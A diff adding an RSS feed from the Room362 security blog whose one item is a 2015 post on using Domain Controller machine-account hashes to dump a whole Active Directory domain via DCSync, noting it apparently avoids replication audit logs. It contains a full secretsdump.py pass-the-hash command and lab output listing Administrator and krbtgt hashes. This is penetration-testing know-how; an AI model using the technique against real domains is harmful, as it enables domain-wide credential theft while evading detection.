@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hashdump on Room362</title>
+    <link>//room362.com/tags/hashdump/</link>
+    <description>Recent content in Hashdump on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Tue, 15 Sep 2015 07:35:28 -0500</lastBuildDate>
+    <atom:link href="//room362.com/tags/hashdump/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Using Domain Controller Account Passwords To HashDump Domains</title>
+      <link>//room362.com/post/2015/using-domain-controller-account-passwords-to-hashdump-domains/</link>
+      <pubDate>Tue, 15 Sep 2015 07:35:28 -0500</pubDate>
+      
+      <guid>//room362.com/post/2015/using-domain-controller-account-passwords-to-hashdump-domains/</guid>
+      <description>&lt;p&gt;Since I follow both &lt;a href=&#34;https://twitter.com/carlos_perez&#34;&gt;Carlos Perez&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;Benjamin Delpy&lt;/a&gt; on Twitter, something caught my eye on August 2nd, soon after &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;Benjamin Delpy&lt;/a&gt; drops &lt;a href=&#34;https://twitter.com/gentilkiwi/status/627977943923490816&#34;&gt;DCSync&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/Carlos_Perez&#34;&gt;@Carlos_Perez&lt;/a&gt; haha, if yes, it will be a 0d ;)&lt;br&gt;No, like always it needs some rights ;) DA is cool, maybe DC$ is enough&lt;/p&gt;&amp;mdash; Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/627980725074153473&#34;&gt;August 2, 2015&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;And then later on August 28th, again about the DC$ account (Domain Controller computer account):&lt;/p&gt;
+
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/hashtag/mimikatz?src=hash&#34;&gt;#mimikatz&lt;/a&gt; DCSync make logs with &amp;#39;Directory Service Access&amp;#39; DS-Replication-Get-Changes*&lt;br&gt;Except if you use a DC account &lt;a href=&#34;http://t.co/QAChOGU3z7&#34;&gt;pic.twitter.com/QAChOGU3z7&lt;/a&gt;&lt;/p&gt;&amp;mdash; Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/637402457740562432&#34;&gt;August 28, 2015&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;Because DCSync is calling on &amp;ldquo;sync&amp;rdquo; based APIs of Active Directory, that are, by default, used only by Domain Controllers, all Domain Controller computer accounts would have the ability to do this as well as the Domain/Enterprise Admins.&lt;/p&gt;
+
+&lt;p&gt;Anyone who&amp;rsquo;s ever administered an Active Directory, knows that computer accounts change their passwords automatically. How often do they change them?&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://support.microsoft.com/en-us/kb/154501:&#34;&gt;https://support.microsoft.com/en-us/kb/154501:&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;Machine account passwords are regularly changed for security purposes. By default, on Windows NT-based computers, the machine account password automatically changes every &lt;strong&gt;seven days&lt;/strong&gt;. Starting with Windows 2000-based computers, the machine account password automatically changes every &lt;strong&gt;30 days&lt;/strong&gt;.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;PSSSST!! That article is about how to &lt;strong&gt;DISABLE&lt;/strong&gt; automatic password changing&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;//room362.com/images/2015/activedirectory_muhaha.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright. So, I&amp;rsquo;m not going to go into &amp;ldquo;how&amp;rdquo; to get the hashes for a computer account, but if you&amp;rsquo;ve ever dumped passwords before, the computer accounts are the ones with the &amp;ldquo;$&amp;rdquo; on the end. Find the ones that are domain controllers, match up the hashes, and use &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py&#34;&gt;Impacket&amp;rsquo;s secretsdump.py&lt;/a&gt; to your heart&amp;rsquo;s content. (Or until the password changes for that DC, then you use another one to dump it again, oh, did I not mention that computers don&amp;rsquo;t change their passwords all at the same time in that 30 day window?)&lt;/p&gt;
+
+&lt;p&gt;Remember, Domain Controller&amp;rsquo;s don&amp;rsquo;t have a lot of other permissions, so you need to use the &amp;ldquo;&lt;code&gt;-just-dc&lt;/code&gt;&amp;rdquo; option in SecretsDump in order for it to just do the domain dump:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15
+
+Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Happy #HackersDay&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
